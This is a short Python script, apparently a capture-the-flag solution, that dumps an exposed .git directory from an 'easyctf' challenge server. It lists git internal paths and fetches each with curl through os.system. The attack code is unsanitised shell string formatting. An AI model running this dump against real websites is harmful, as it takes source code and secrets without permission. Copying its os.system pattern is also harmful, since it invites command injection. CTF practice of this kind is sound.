import os
from pprint import pprint

PATH = '/path/to/my/new/local/empty/.git'
URL = 'http://edge2.web.easyctf.com/'

tree = []

for elem in os.walk(PATH):
    path, dirs, files = elem
    
    for f in files:
        p = path + '/' + f
        _, git, p = p.partition('.git/')
        tree.append(git + p)


tree.extend(['.git/index',
            '.git/packed-refs',
            '.git/COMMIT_EDITMSG',
            '.git/refs/heads/master',
            '.git/refs/remotes/origin/HEAD',
            '.git/logs/HEAD',
            '.git/logs/refs/heads/master',
            '.git/logs/refs/remotes/origin/HEAD'])

    
for path in tree:
    os.system('curl {} > {}'.format(URL + path, path))


pprint(tree)
print('OK')

